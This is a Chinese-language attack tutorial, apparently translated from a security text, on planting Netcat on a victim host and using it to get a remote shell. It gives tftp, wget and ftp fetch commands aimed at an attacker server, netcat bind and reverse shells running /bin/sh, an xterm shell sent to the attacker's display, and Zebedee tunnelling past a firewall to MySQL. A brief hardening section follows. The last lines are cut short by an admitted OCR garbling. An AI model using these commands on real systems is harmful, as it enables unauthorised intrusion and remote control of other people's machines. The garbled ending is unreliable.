
# 使用 Netcat 获取远程 Shell

可以通过以下步骤获取远程 Shell：

- 1. **上传 Netcat** Netcat 可用于跨越网络发送远程 Shell。首先，你必须将 Netcat 放置在受害者主机上。这可以通过在受害者主机上执行 `tftp` 命令来实现：
```
tftp -i attacker_s_ip_address nc
```
攻击者必须运行一个可访问的 TFTP 服务器，并将 Netcat 二进制文件放置在 TFTP 目录（通常为 `/tftpboot`）中，以便上述上传操作能够成功。
除了 TFTP，也可以在受害者机器上执行 `wget` 工具来获取放置在攻击者 Web 服务器上的 Netcat 二进制文件：
```
wget http://attacker_s_ip_address/nc
```
或者，攻击者可以使用 FTP 命令行客户端将 Netcat 二进制文件上传到受害者主机：
```
ftp -n ftpscript
```
其中 ftpscript 是包含以下内容的文本文件：
```
attacker_s_ftp_server_ip_address
user_on_attacker_s_ftp_server user_password
bin
get nc
bye
```
通过在受害者主机上运行以下 echo 命令可以创建 ftpscript：
```
echo attacker_s_ftp_server_ip_address > ftpscript; echo user_on_attacker_s_ftp_server user_password >> ftpscript; echo bin >> ftpscript; echo get nc >> ftpscript; echo bye >> ftpscript
```

- 2. **使用 Netcat** 一旦将 Netcat 放置在受害者机器上，就可以用它监听任意端口并在连接时提供 Shell：
```
./nc -e /bin/sh -l -p 9999
```
现在，攻击者只需要连接到受害者的 9999 端口即可接收命令 Shell：

```
nc victim's_ip_address 9999
```

Netcat 也可以被指示连接到入侵者的端口以提供命令 Shell。首先，攻击者必须监听一个端口：

```
nc -v -n -l -p 9999
```

现在，必须在受害者主机上执行以下操作：

```
/nc -e /bin/sh attacker's_ip_address 9999
```

Netcat 默认未启用 -e 选项，该选项用于建立连接后执行程序。如果你希望它支持 -e 标志，则必须使用 `-DGAPING_SECURITY_HOLE` 标志编译 Netcat。记住在将 Netcat 二进制文件上传到受害者主机之前执行此操作。

# 使用 xterm 获取远程 Shell

如果受害者安装了如 xterm 等 X 终端客户端软件，攻击者可以执行它来接收远程 Shell：

```
xterm -display attacker's_ip_address:0.0 &
```

此命令将导致 xterm 实例在受害者主机上执行并显示在攻击者的 X 服务器上。当然，攻击者必须先运行以下命令以允许 xterm 显示在其 X 服务器上：

```
xhost +victim's_ip_address
```

以下你可以采取的步骤，以增加入侵者获取远程 Shell 的难度：

- 配置防火墙阻止所有未使用的端口。此外，收紧防火墙规则以限制出站连接。例如，仅作为 Web 服务器的主机不得允许在任何端口上发起出站连接。

- 从生产主机卸载如 telnet、ftp、wget 和 tfftp 等客户端软件。

- 从生产主机卸载 X 程序和库。

# 端口重定向

端口重定向技术可绕过弱的防火墙规则，连接到运行在防火墙过滤端口上的服务。为了方便端口重定向，我们将使用 Zebedee，这是一种可以在 http://www.winton.org.uk/zebedee 获取的命令行工具。假设受害者机器上可用 Zebedee。如果没有，则使用早之前“上传 Netcat”部分中描述的方法将 Zebedee 二进制文件上传到受害者主机。

# 本地端口重定向

假设入侵者需要连接到已被攻主机上的 MySQL 服务器。如果被攻主机上或其之前有一个防火墙允许 80 端口的入站连接，入侵者可以在受害者机器上执行以下操作：

```
[victimhost]$ zebedee -T 80 -s 127.0.0.1:3306
```

接下来，入侵者可以在其机器上执行以下操作：

```
[intruder's_host]$ zebedee -T 80 victim's_ip_address 3306:127.0.0.1:3306
```

这将导致入侵者主机上的 Zebedee 进程连接到受害者主机 80 端口上的 Zebedee 进程。入侵者现在连接其主机的 3306 端口 (127.0.0.1)，从而通过 Zebedee 隧道连接到受害者主机的 3306 端口。

> 入侵者可以在受害者主机上运行 `ifconfig` 和 `route -n` 命令来识别额外的网卡……（此处原文存在大量 OCR 重复错误，已根据逻辑简化处理）。

